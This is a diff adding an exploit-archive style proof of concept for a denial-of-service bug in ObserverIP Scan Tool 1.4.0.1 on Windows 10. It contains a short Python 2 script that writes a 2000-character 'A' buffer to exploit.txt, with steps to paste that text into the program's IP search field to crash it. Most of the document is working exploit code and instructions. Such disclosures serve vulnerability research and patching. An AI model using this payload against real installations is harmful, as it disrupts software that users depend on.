@@ -1,0 +1,26 @@
+# Exploit Title: ObserverIP Scan Tool 1.4.0.1 - Denial of Service (PoC)  
+# Author: Gionathan "John" Reale
+# Discovey Date: 2018-08-16
+# Homepage: https://www.ambientweather.com
+# Software Link: https://p10.secure.hostingprod.com/@site.ambientweatherstore.com/ssl/iptools/IPTools64bit.exe
+# Tested Version: 1.4.0.1
+# Tested on OS: Windows 10
+
+# Steps to Reproduce: Run the python exploit script, it will create a new 
+# file with the name "exploit.txt" just copy the text inside "exploit.txt"
+# and start the program. Now click "Okay" and in the new window paste the content of 
+# "exploit.txt" into the following fields:"IP". Click "Search" and you will see a crash.
+
+#!/usr/bin/python
+   
+buffer = "A" * 2000
+
+payload = buffer
+try:
+    f=open("exploit.txt","w")
+    print "[+] Creating %s bytes evil payload.." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created"
